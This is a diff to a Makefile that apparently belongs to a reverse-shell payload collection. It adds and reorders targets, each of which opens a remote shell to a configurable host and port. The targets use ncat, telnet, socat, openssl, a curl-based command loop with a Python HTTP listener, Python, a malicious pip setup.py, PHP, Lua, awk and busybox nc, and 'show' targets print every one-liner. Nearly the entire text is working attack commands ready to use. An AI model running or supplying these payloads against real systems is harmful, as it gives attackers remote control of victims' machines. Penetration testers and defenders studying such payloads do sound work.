@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP	:= /tmp/f
 
-METHODS	:= listener bash ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-listener curl curl-listener python3 perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia huskell socat pip cpan busybox-nc gcc javac
+METHODS	:= listener ncat1 ncat2 telnet1 telnet2 socat socket openssl openssl-listener curl curl-listener bash ksh zsh pwsh python3 pip perl cpan php1 php2 php3 php4 php5 php6 lua ruby1 ruby2 irb1 irb2 node jrunscript jjs julia huskell gcc javac awk busybox-nc
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -41,6 +41,92 @@ listener:
 
 listener-show:
 	@printf "nc -lvp $(PORT)\n"
+
+############################################################
+
+########################## NETCAT ##########################
+
+ncat1:
+	ncat -e $(SHELL) $(HOST) $(PORT)
+
+ncat1-show:
+	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"
+
+ncat2:
+	mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)
+
+ncat2-show:
+	@printf "mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)\n"
+
+############################################################
+
+########################## TELNET ##########################
+
+telnet1:
+	telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)
+
+telnet1-show:
+	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"
+
+telnet2:
+	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)
+
+telnet2-show:
+	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)\n"
+
+############################################################
+
+########################## SOCAT ###########################
+
+socat:
+	socat tcp:$(HOST):$(PORT) exec:$(SHELL),stderr
+
+socat-show:
+	@printf "socat tcp:$(HOST):$(PORT) exec:$(SHELL),stderr\n"
+
+############################################################
+
+########################## SOCKET ##########################
+
+socket:
+	socket -p '$(SHELL)' $(HOST) $(PORT)
+
+socket-show:
+	@printf "socket -p '$(SHELL)' $(HOST) $(PORT)\n"
+
+############################################################
+
+########################## OPENSSL #########################
+
+openssl:
+	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)
+
+openssl-show:
+	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
+
+openssl-listener:
+	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
+	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)
+
+openssl-listener-show:
+	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
+	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"
+
+############################################################
+
+########################### CURL ###########################
+
+curl:
+	while true; do cmd=$$(curl -s http://$(HOST):$(PORT)); res=$$($(SHELL) -c "$$cmd" 2>&1); curl -X POST -d "$$res" http://$(HOST):$(PORT); done;
+
+curl-show:
+	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(SHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"
+
+curl-listener:
+	python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type("H",(BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input("[+] Enter command to execute: ").encode())), "do_POST":lambda s:(s.send_response(200),s.end_headers(),print("[+] Command output:\n"+s.rfile.read(int(s.headers["Content-Length"])).decode()))}); HTTPServer(("0.0.0.0",$(PORT)),H).serve_forever()'
+
+curl-listener-show:
+	@printf "python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type(\"H\",(BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input(\"[+] Enter command to execute: \").encode())), \"do_POST\":lambda s:(s.send_response(200),s.end_headers(),print(\"[+] Command output:\\\\n\"+s.rfile.read(int(s.headers[\"Content-Length\"])).decode()))}); HTTPServer((\"0.0.0.0\",$(PORT)),H).serve_forever()'\n"
 
 ############################################################
 
@@ -90,82 +176,6 @@ pwsh-show:
 
 ############################################################
 
-########################## NETCAT ##########################
-
-ncat1:
-	ncat -e $(SHELL) $(HOST) $(PORT)
-
-ncat1-show:
-	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"
-
-ncat2:
-	mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)
-
-ncat2-show:
-	@printf "mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)\n"
-
-############################################################
-
-########################## TELNET ##########################
-
-telnet1:
-	telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)
-
-telnet1-show:
-	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"
-
-telnet2:
-	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)
-
-telnet2-show:
-	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)\n"
-
-############################################################
-
-########################## SOCKET ##########################
-
-socket:
-	socket -p '$(SHELL)' $(HOST) $(PORT)
-
-socket-show:
-	@printf "socket -p '$(SHELL)' $(HOST) $(PORT)\n"
-
-############################################################
-
-########################## OPENSSL #########################
-
-openssl:
-	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)
-
-openssl-show:
-	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
-
-openssl-listener:
-	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
-	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)
-
-openssl-listener-show:
-	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
-	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"
-
-############################################################
-
-########################### CURL ###########################
-
-curl:
-	while true; do cmd=$$(curl -s http://$(HOST):$(PORT)); res=$$($(SHELL) -c "$$cmd" 2>&1); curl -X POST -d "$$res" http://$(HOST):$(PORT); done;
-
-curl-show:
-	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(SHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"
-
-curl-listener:
-	python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type("H",(BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input("[+] Enter command to execute: ").encode())), "do_POST":lambda s:(s.send_response(200),s.end_headers(),print("[+] Command output:\n"+s.rfile.read(int(s.headers["Content-Length"])).decode()))}); HTTPServer(("0.0.0.0",$(PORT)),H).serve_forever()'
-
-curl-listener-show:
-	@printf "python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type(\"H\",(BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input(\"[+] Enter command to execute: \").encode())), \"do_POST\":lambda s:(s.send_response(200),s.end_headers(),print(\"[+] Command output:\\\\n\"+s.rfile.read(int(s.headers[\"Content-Length\"])).decode()))}); HTTPServer((\"0.0.0.0\",$(PORT)),H).serve_forever()'\n"
-
-############################################################
-
 ########################## PYTHON ##########################
 
 python3:
@@ -173,6 +183,16 @@ python3:
 
 python3-show:
 	@printf "python3 -c 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(SHELL)\", [\"$(SHELL)\"])'\n"
+
+############################################################
+
+########################### PIP ############################
+
+pip:
+	mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(SHELL)", ["$(SHELL)"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)
+
+pip-show:
+	@printf "mkdir -p $(TMP); echo 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(SHELL)\", [\"$(SHELL)\"])' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
 
 ############################################################
 
@@ -199,40 +219,50 @@ cpan-show:
 ############################ PHP ###########################
 
 php1:
-	php -r 'fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'
-
-php1-show:
-	@printf "php -r 'fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"
-
-php2:
-	php -r 'fsockopen("$(HOST)",$(PORT)); system("$(SHELL) <&3 >&3 2>&3");'
-
-php2-show:
-	@printf "php -r 'fsockopen(\"$(HOST)\",$(PORT)); system(\"$(SHELL) <&3 >&3 2>&3\");'\n"
-
-php3:
-	php -r 'fsockopen("$(HOST)",$(PORT)); passthru("$(SHELL) <&3 >&3 2>&3");'
-
-php3-show:
-	@printf "php -r 'fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(SHELL) <&3 >&3 2>&3\");'\n"
-
-php4:
-	php -r 'fsockopen("$(HOST)",$(PORT)); `$(SHELL) <&3 >&3 2>&3`;'
-
-php4-show:
-	@printf "php -r 'fsockopen(\"$(HOST)\",$(PORT)); \`$(SHELL) <&3 >&3 2>&3\`;'\n"
-
-php5:
-	php -r 'fsockopen("$(HOST)",$(PORT)); popen("$(SHELL) <&3 >&3 2>&3", "r");'
-
-php5-show:
-	@printf "php -r 'fsockopen(\"$(HOST)\",$(PORT)); popen(\"$(SHELL) <&3 >&3 2>&3\", \"r\");'\n"
-
-php6:
 	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); proc_open("$(SHELL)", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'
 
-php6-show:
+php1-show:
 	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); proc_open(\"$(SHELL)\", array(0=>\$$sock,1=>\$$sock,2=>\$$sock), \$$pipes);'\n"
+
+php2:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); exec("$(SHELL) <&3 >&3 2>&3");'
+
+php2-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php3:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); system("$(SHELL) <&3 >&3 2>&3");'
+
+php3-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); system(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php4:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); shell_exec("$(SHELL) <&3 >&3 2>&3");'
+
+php4-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); shell_exec(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php5:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); passthru("$(SHELL) <&3 >&3 2>&3");'
+
+php5-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(SHELL) <&3 >&3 2>&3\");'\n"
+
+php6:
+	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); popen("$(SHELL) <&3 >&3 2>&3", "r");'
+
+php6-show:
+	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); popen(\"$(SHELL) <&3 >&3 2>&3\", \"r\");'\n"
+
+############################################################
+
+############################ LUA ###########################
+
+lua:
+	lua -e 'socket = require("socket"); require("os"); socket.tcp():connect("$(HOST)",$(PORT)); os.execute("$(SHELL) <&3 >&3 2>&3");'
+
+lua-show:
+	@printf "lua -e 'socket = require(\"socket\"); require(\"os\"); socket.tcp():connect(\"$(HOST)\",$(PORT)); os.execute(\"$(SHELL) <&3 >&3 2>&3\");'\n"
 
 ############################################################
 
@@ -308,36 +338,6 @@ julia-show:
 
 ############################################################
 
-########################## SOCAT ###########################
-
-socat:
-	socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane
-
-socat-show:
-	@printf "socat tcp-connect:$(HOST):$(PORT) exec:$(SHELL),pty,stderr,setsid,sigint,sane\n"
-
-############################################################
-
-########################### PIP ############################
-
-pip:
-	mkdir -p $(TMP); echo 'import sys,socket,os,pty; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; pty.spawn("$(SHELL)")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)
-
-pip-show:
-	@printf "mkdir -p $(TMP); echo 'import sys,socket,os,pty; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"$(SHELL)\")' > $(TMP)/setup.py; pip install --break-system-packages $(TMP); rm -r $(TMP)\n"
-
-############################################################
-
-######################## BUSYBOX-NC ########################
-
-busybox-nc:
-	busybox nc $(HOST) $(PORT) -e $(SHELL)
-
-busybox-nc-show:
-	@printf "busybox nc $(HOST) $(PORT) -e $(SHELL)\n"
-
-############################################################
-
 ########################### GCC ############################
 
 C_CODE := src/reverse_shell.c
@@ -360,5 +360,25 @@ javac:
 
 javac-show:
 	@printf "javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class\n"
+
+############################################################
+
+########################### AWK ############################
+
+awk:
+	awk 'BEGIN { sock = "/inet/tcp/0/$(HOST)/$(PORT)"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& sock; close(c)}}'
+
+awk-show:
+	@printf "awk 'BEGIN { sock = \"/inet/tcp/0/$(HOST)/$(PORT)\"; while (1) { if ((sock |& getline c) <= 0) break; while (c && (c |& getline) > 0) print \$0 |& sock; close(c)}}'\n"
+
+############################################################
+
+######################## BUSYBOX-NC ########################
+
+busybox-nc:
+	busybox nc $(HOST) $(PORT) -e $(SHELL)
+
+busybox-nc-show:
+	@printf "busybox nc $(HOST) $(PORT) -e $(SHELL)\n"
 
 ############################################################
